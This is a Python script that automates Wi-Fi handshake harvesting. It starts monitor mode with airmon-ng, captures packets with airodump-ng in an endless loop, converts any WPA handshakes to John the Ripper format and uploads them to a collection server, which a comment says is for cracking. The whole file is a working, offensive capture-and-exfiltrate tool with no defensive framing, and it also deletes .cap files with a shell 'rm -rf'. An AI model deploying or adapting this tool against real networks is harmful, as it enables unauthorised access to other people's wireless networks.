import os
import subprocess
import sys
from signal import SIGINT, signal
from time import sleep

import requests

# Server URL to upload handshakes on
SERVER_URL = "http://localhost:1337"
# API endpoint to upload handshakes on
HANDSHAKE_UPLOAD_ROUTE = "/upload"

# John format handshakes file
JOHN_HANDSHAKES_FILE = "handshakes.john"

# Network interface to start monitor mode
NETWORK_INTERFACE = "wlan0"
# Network interface in monitor mode
MONITOR_INTERFACE = "wlan0mon"
# File .cap prefix
HANDSHAKE_FILE_PREFIX = "handshake"

# Timer to wait for airodump-ng before checking for handshakes
SLEEP_TIMER = 1


def handler(signum, frame) -> None:
    OnExit()
    exit(0)


def ConvertHandshakeToJohn(filepath: str) -> bool:
    cmd = [
        "wpapcap2john",     # Binary Name
        "-c",               # Output only confirm handshakes
        filepath,           # .cap file file path
    ]
    # Run wpapcap2john to convert handshakes to john available format
    wpapcap2john = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    out = wpapcap2john.communicate()
    # Get converted handshakes
    handshake = out[0]
    if len(handshake) != 0:
        # Append handshakes to the JOHN_HANDSHAKES_FILE
        with open(JOHN_HANDSHAKES_FILE, "a+") as file:
            file.write(handshake.decode("utf-8"))
        return True
    return False


def StartMonitorMode(iface: str) -> None:
    cmd = [
        "airmon-ng",    # Binary name
        "start",        # Start monitor mode
        iface           # Interface name
    ]
    # Run airmon-ng to start monitor mode
    airmon = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    # Check if the binary has root permissions else exit
    out = airmon.communicate()
    if (out[0] == b"Run it as root\n"):
        print("The script should be run as root", file=sys.stderr)
        exit(1)
    return


def StopMonitorMode(iface: str) -> None:
    cmd = [
        "airmon-ng",    # Binary name
        "stop",         # Stop monitor mode
        iface           # Interface name
    ]
    # Run airmon-ng to stop monitor mode
    airmon = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    # Check if the binary has root permissions else exit
    out = airmon.communicate()
    if (out[0] == b"Run it as root\n"):
        print("The script should be run as root", file=sys.stderr)
        exit(1)
    return


def DumpNetworkData(iface: str, file_prefix: str) -> subprocess.Popen[bytes]:
    cmd = [
        "airodump-ng",              # Binary name
        iface,                      # Network interface to start capturing packets from
        f"-w{file_prefix}",         # Write file prefix
        "--beacons",                # Store beacons in the .cap file
        "--output-format=pcap",     # Output format as cap
        "-f1000"                    # 1000ms delay between channel hops
    ]
    # Run airodump-ng to start capturing packets
    airodump = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return airodump


def OnStart():
    # Attach handler to Signal Interrupt which stops the monitor mode for Wi-Fi interface
    signal(SIGINT, handler)

    # Remove all older pcap files
    os.system("rm -rf *.cap")

    # Start monitor mode on specified network interface
    StartMonitorMode(NETWORK_INTERFACE)


def OnExit():
    # Stop Monitor Mode on specified network interface
    StopMonitorMode(MONITOR_INTERFACE)

    # Wait for Wi-Fi to reconnect
    sleep(5)

    handshakes = os.listdir()
    if len(handshakes) > 0:
        # Convert the handshake file to john format which also checks if the file has WPA Handshakes
        handshakes_captured = ConvertHandshakeToJohn(handshakes[0])
        if handshakes_captured:
            with open(JOHN_HANDSHAKES_FILE, 'rb') as file:
                # Send the john format handshake file to server
                requests.post(
                    SERVER_URL + HANDSHAKE_UPLOAD_ROUTE,
                    files={"file": file}
                )


def Run():
    # Start monitor mode and delete previous network .cap files
    OnStart()

    # Run airudump-ng
    airodump = DumpNetworkData(MONITOR_INTERFACE, HANDSHAKE_FILE_PREFIX)
    # Wait for airodump-ng to run for SLEEP_TIMER minutes before checking for handshakes
    sleep(60 * SLEEP_TIMER)
    # Terminate airodump-ng
    airodump.kill()

    # Check for any captured handshakes and send them to server for cracking
    OnExit()


def main():
    # Change directory to Handshakes
    os.makedirs("Handshakes")
    os.chdir("Handshakes")

    # Run in an infinite loop to keep capturing network packets
    while (1):
        Run()


if __name__ == "__main__":
    main()
